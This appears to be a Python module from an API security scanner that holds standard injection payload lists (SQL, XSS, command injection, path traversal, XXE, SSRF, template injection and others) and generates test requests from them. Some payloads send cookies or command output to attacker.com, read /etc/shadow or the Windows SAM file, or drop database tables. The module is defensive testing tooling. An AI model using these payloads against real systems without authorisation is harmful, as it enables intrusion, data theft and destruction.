#!/usr/bin/env python3
"""
Security Payload Templates
===========================
Static security testing payload library.

Based on OWASP Top 10, PayloadsAllTheThings, and industry standards.

Cost savings: 100% (no LLM needed - payloads are standardized)
Coverage: OWASP Top 10 + common attack vectors
"""

import logging
from typing import Dict, List, Any, Optional

logger = logging.getLogger("api_scanner.security_templates.payloads")


class SecurityPayloadTemplates:
    """
    Static security payload templates for common vulnerabilities.

    No LLM needed - security testing payloads are well-established patterns.
    Based on:
    - OWASP Top 10
    - PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
    - PortSwigger Web Security Academy
    """

    # SQL Injection Payloads
    SQL_INJECTION = [
        # Authentication bypass
        {"payload": "' OR '1'='1", "description": "Classic SQL injection - authentication bypass"},
        {"payload": "admin' --", "description": "Comment-based bypass"},
        {"payload": "' OR 1=1--", "description": "Boolean-based blind SQL injection"},
        {"payload": "admin'/*", "description": "Multi-line comment bypass"},

        # Union-based
        {"payload": "' UNION SELECT NULL--", "description": "Union-based SQL injection (1 column)"},
        {"payload": "' UNION SELECT NULL,NULL--", "description": "Union-based SQL injection (2 columns)"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "description": "Union-based SQL injection (3 columns)"},

        # Error-based
        {"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "description": "Error-based SQL injection (MSSQL)"},
        {"payload": "' AND extractvalue(1, concat(0x7e, version()))--", "description": "Error-based SQL injection (MySQL)"},

        # Time-based blind
        {"payload": "'; WAITFOR DELAY '00:00:05'--", "description": "Time-based blind SQL injection (MSSQL)"},
        {"payload": "' OR SLEEP(5)--", "description": "Time-based blind SQL injection (MySQL)"},
        {"payload": "' OR pg_sleep(5)--", "description": "Time-based blind SQL injection (PostgreSQL)"},

        # Stacked queries
        {"payload": "'; DROP TABLE users--", "description": "Stacked query - dangerous (destructive)"},
        {"payload": "'; INSERT INTO users VALUES ('hacker', 'password')--", "description": "Stacked query - data manipulation"},
    ]

    # XSS (Cross-Site Scripting) Payloads
    XSS = [
        # Reflected XSS
        {"payload": "<script>alert('XSS')</script>", "description": "Basic reflected XSS"},
        {"payload": "<img src=x onerror=alert('XSS')>", "description": "Event-based XSS"},
        {"payload": "<svg/onload=alert('XSS')>", "description": "SVG-based XSS"},
        {"payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>", "description": "Iframe-based XSS"},

        # Encoded payloads
        {"payload": "%3Cscript%3Ealert('XSS')%3C/script%3E", "description": "URL-encoded XSS"},
        {"payload": "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", "description": "HTML entity encoded XSS"},

        # Advanced XSS
        {"payload": "<img src=x onerror=\"fetch('http://attacker.com?cookie='+document.cookie)\">", "description": "Cookie stealing XSS"},
        {"payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>", "description": "Breaking out of attributes"},
        {"payload": "javascript:alert('XSS')", "description": "JavaScript protocol XSS"},

        # DOM XSS
        {"payload": "#<img src=x onerror=alert('XSS')>", "description": "DOM-based XSS via hash"},
    ]

    # Command Injection Payloads
    COMMAND_INJECTION = [
        # Unix/Linux
        {"payload": "; ls -la", "description": "Command separator - list files"},
        {"payload": "| whoami", "description": "Pipe operator - get current user"},
        {"payload": "`id`", "description": "Command substitution - get user ID"},
        {"payload": "$(cat /etc/passwd)", "description": "Command substitution - read passwd file"},
        {"payload": "&& cat /etc/shadow", "description": "AND operator - read shadow file"},
        {"payload": "; curl http://attacker.com?data=$(whoami)", "description": "Data exfiltration"},

        # Windows
        {"payload": "& dir", "description": "Windows - list directory"},
        {"payload": "| type C:\\Windows\\System32\\drivers\\etc\\hosts", "description": "Windows - read hosts file"},
        {"payload": "&& net user", "description": "Windows - list users"},

        # Blind command injection
        {"payload": "; sleep 10", "description": "Time-based blind - Unix"},
        {"payload": "& timeout /t 10", "description": "Time-based blind - Windows"},
    ]

    # Path Traversal Payloads
    PATH_TRAVERSAL = [
        # Basic traversal
        {"payload": "../../../etc/passwd", "description": "Basic path traversal - Unix"},
        {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "description": "Basic path traversal - Windows"},

        # Encoded traversal
        {"payload": "....//....//....//etc/passwd", "description": "Double-encoded path traversal"},
        {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "description": "URL-encoded path traversal"},
        {"payload": "..%252f..%252f..%252fetc%252fpasswd", "description": "Double URL-encoded"},

        # Absolute paths
        {"payload": "/etc/passwd", "description": "Absolute path - Unix"},
        {"payload": "C:\\Windows\\System32\\config\\SAM", "description": "Absolute path - Windows"},

        # Null byte injection
        {"payload": "../../../etc/passwd%00", "description": "Null byte injection (legacy)"},
        {"payload": "../../../etc/passwd\x00.jpg", "description": "Null byte with extension"},
    ]

    # XXE (XML External Entity) Payloads
    XXE = [
        {
            "payload": """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",
            "description": "Basic XXE - file disclosure"
        },
        {
            "payload": """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd" >]>
<foo>&xxe;</foo>""",
            "description": "XXE - external DTD"
        },
        {
            "payload": """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd" >
%dtd;]>
<foo>&send;</foo>""",
            "description": "Blind XXE - out-of-band exfiltration"
        },
    ]

    # NoSQL Injection Payloads
    NOSQL_INJECTION = [
        # MongoDB
        {"payload": {"$ne": None}, "description": "MongoDB - not equal (authentication bypass)"},
        {"payload": {"$gt": ""}, "description": "MongoDB - greater than (bypass)"},
        {"payload": {"$regex": ".*"}, "description": "MongoDB - regex match all"},
        {"payload": {"username": {"$ne": None}, "password": {"$ne": None}}, "description": "MongoDB - double bypass"},

        # JSON-based
        {"payload": '{"$ne": null}', "description": "NoSQL injection - JSON format"},
        {"payload": '{"$where": "sleep(5000)"}', "description": "NoSQL - time-based blind"},
    ]

    # LDAP Injection Payloads
    LDAP_INJECTION = [
        {"payload": "*", "description": "LDAP wildcard - match all"},
        {"payload": "admin)(&)", "description": "LDAP filter bypass"},
        {"payload": "*)(uid=*))(|(uid=*", "description": "LDAP injection - authentication bypass"},
        {"payload": "admin)(|(password=*))", "description": "LDAP injection - password disclosure"},
    ]

    # Header Injection Payloads
    HEADER_INJECTION = [
        # CRLF injection
        {"payload": "test\r\nSet-Cookie: admin=true", "description": "CRLF injection - cookie manipulation"},
        {"payload": "test\r\nLocation: http://attacker.com", "description": "CRLF injection - redirect"},

        # Host header injection
        {"payload": "attacker.com", "description": "Host header injection - cache poisoning"},
        {"payload": "localhost:8080@attacker.com", "description": "Host header injection - confused deputy"},
    ]

    # SSRF (Server-Side Request Forgery) Payloads
    SSRF = [
        # Internal network
        {"payload": "http://localhost/admin", "description": "SSRF - localhost access"},
        {"payload": "http://127.0.0.1/admin", "description": "SSRF - loopback access"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "description": "SSRF - AWS metadata (cloud)"},
        {"payload": "http://metadata.google.internal/", "description": "SSRF - GCP metadata"},

        # Internal IP ranges
        {"payload": "http://192.168.1.1/", "description": "SSRF - private network (192.168.x.x)"},
        {"payload": "http://10.0.0.1/", "description": "SSRF - private network (10.x.x.x)"},

        # Bypass techniques
        {"payload": "http://127.1/admin", "description": "SSRF - shortened IP"},
        {"payload": "http://[::1]/admin", "description": "SSRF - IPv6 loopback"},
    ]

    # Template Injection Payloads
    TEMPLATE_INJECTION = [
        # Jinja2 (Python)
        {"payload": "{{7*7}}", "description": "Jinja2 - basic math test"},
        {"payload": "{{config.items()}}", "description": "Jinja2 - config disclosure"},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "description": "Jinja2 - RCE via class introspection"},

        # Twig (PHP)
        {"payload": "{{7*'7'}}", "description": "Twig - string multiplication test"},
        {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "description": "Twig - RCE"},

        # FreeMarker (Java)
        {"payload": "${7*7}", "description": "FreeMarker - basic math test"},
        {"payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "description": "FreeMarker - RCE"},
    ]

    @staticmethod
    def get_all_categories() -> List[str]:
        """Get list of all payload categories."""
        return [
            "sql_injection",
            "xss",
            "command_injection",
            "path_traversal",
            "xxe",
            "nosql_injection",
            "ldap_injection",
            "header_injection",
            "ssrf",
            "template_injection",
        ]

    @staticmethod
    def get_payloads_by_category(category: str) -> List[Dict[str, Any]]:
        """
        Get payloads for specific vulnerability category.

        Args:
            category: Vulnerability category (e.g., "sql_injection", "xss")

        Returns:
            List of payload dictionaries with 'payload' and 'description' keys
        """
        category_lower = category.lower()

        mapping = {
            "sql_injection": SecurityPayloadTemplates.SQL_INJECTION,
            "xss": SecurityPayloadTemplates.XSS,
            "command_injection": SecurityPayloadTemplates.COMMAND_INJECTION,
            "path_traversal": SecurityPayloadTemplates.PATH_TRAVERSAL,
            "xxe": SecurityPayloadTemplates.XXE,
            "nosql_injection": SecurityPayloadTemplates.NOSQL_INJECTION,
            "ldap_injection": SecurityPayloadTemplates.LDAP_INJECTION,
            "header_injection": SecurityPayloadTemplates.HEADER_INJECTION,
            "ssrf": SecurityPayloadTemplates.SSRF,
            "template_injection": SecurityPayloadTemplates.TEMPLATE_INJECTION,
        }

        if category_lower in mapping:
            logger.debug(f"Retrieved {len(mapping[category_lower])} payloads for {category}")
            return mapping[category_lower]
        else:
            logger.warning(f"Unknown payload category: {category}")
            return []

    @staticmethod
    def get_all_payloads() -> Dict[str, List[Dict[str, Any]]]:
        """
        Get all security payloads organized by category.

        Returns:
            Dictionary mapping category names to payload lists
        """
        return {
            "sql_injection": SecurityPayloadTemplates.SQL_INJECTION,
            "xss": SecurityPayloadTemplates.XSS,
            "command_injection": SecurityPayloadTemplates.COMMAND_INJECTION,
            "path_traversal": SecurityPayloadTemplates.PATH_TRAVERSAL,
            "xxe": SecurityPayloadTemplates.XXE,
            "nosql_injection": SecurityPayloadTemplates.NOSQL_INJECTION,
            "ldap_injection": SecurityPayloadTemplates.LDAP_INJECTION,
            "header_injection": SecurityPayloadTemplates.HEADER_INJECTION,
            "ssrf": SecurityPayloadTemplates.SSRF,
            "template_injection": SecurityPayloadTemplates.TEMPLATE_INJECTION,
        }

    @staticmethod
    def generate_payload_tests(
        endpoint_info: Dict[str, Any],
        categories: Optional[List[str]] = None
    ) -> List[Dict[str, Any]]:
        """
        Generate security test cases for an endpoint.

        Args:
            endpoint_info: Endpoint metadata (route, method, parameters, etc.)
            categories: Specific vulnerability categories to test (None = all)

        Returns:
            List of test cases with payload, target parameter, and description

        Example:
            >>> endpoint_info = {
            ...     "route": "/users/{user_id}",
            ...     "method": "GET",
            ...     "parameters": [{"name": "user_id", "in": "path", "type": "integer"}]
            ... }
            >>> tests = SecurityPayloadTemplates.generate_payload_tests(endpoint_info)
            >>> len(tests) > 0
            True
        """
        test_cases = []

        # Determine which categories to test
        if categories is None:
            categories = SecurityPayloadTemplates.get_all_categories()

        # Extract testable parameters
        parameters = endpoint_info.get("parameters", [])

        # If no parameters, test common injection points
        if not parameters:
            parameters = [
                {"name": "id", "in": "query", "type": "string"},
                {"name": "search", "in": "query", "type": "string"},
            ]

        # Generate test cases for each category
        for category in categories:
            payloads = SecurityPayloadTemplates.get_payloads_by_category(category)

            for payload_data in payloads:
                # Test each parameter
                for param in parameters:
                    test_case = {
                        "category": category,
                        "payload": payload_data["payload"],
                        "description": payload_data["description"],
                        "target_parameter": param["name"],
                        "parameter_location": param.get("in", "query"),
                        "method": endpoint_info.get("method", "GET"),
                        "route": endpoint_info.get("route", "/"),
                    }
                    test_cases.append(test_case)

        logger.info(f"Generated {len(test_cases)} security test cases for {endpoint_info.get('route')}")
        return test_cases

    @staticmethod
    def inject_into_schema(
        schema: Dict[str, Any],
        category: str,
        limit: int = 5
    ) -> List[Dict[str, Any]]:
        """
        Inject payloads into request schema fields.

        Args:
            schema: OpenAPI request schema (e.g., requestBody.content.schema)
            category: Vulnerability category to test
            limit: Maximum payloads per field (default: 5)

        Returns:
            List of payload-injected request bodies

        Example:
            >>> schema = {
            ...     "type": "object",
            ...     "properties": {
            ...         "username": {"type": "string"},
            ...         "password": {"type": "string"}
            ...     }
            ... }
            >>> results = SecurityPayloadTemplates.inject_into_schema(schema, "sql_injection", limit=2)
            >>> len(results) > 0
            True
        """
        payloads = SecurityPayloadTemplates.get_payloads_by_category(category)[:limit]
        injected_bodies = []

        # Extract schema properties
        properties = schema.get("properties", {})

        if not properties:
            logger.warning("Schema has no properties - cannot inject payloads")
            return []

        # Inject payloads into each string field
        for field_name, field_schema in properties.items():
            field_type = field_schema.get("type", "string")

            # Only inject into string fields (most vulnerable)
            if field_type == "string":
                for payload_data in payloads:
                    # Create base request body with normal values
                    body = {}
                    for prop_name, prop_schema in properties.items():
                        if prop_name == field_name:
                            # Inject payload into target field
                            body[prop_name] = payload_data["payload"]
                        else:
                            # Use default values for other fields
                            body[prop_name] = SecurityPayloadTemplates._get_default_value(prop_schema)

                    injected_bodies.append({
                        "body": body,
                        "injected_field": field_name,
                        "category": category,
                        "description": payload_data["description"],
                    })

        logger.debug(f"Injected {len(injected_bodies)} payloads into schema for {category}")
        return injected_bodies

    @staticmethod
    def _get_default_value(field_schema: Dict[str, Any]) -> Any:
        """Get default value for field based on type."""
        field_type = field_schema.get("type", "string")

        defaults = {
            "string": "test",
            "integer": 1,
            "number": 1.0,
            "boolean": True,
            "array": [],
            "object": {},
        }

        return defaults.get(field_type, "test")
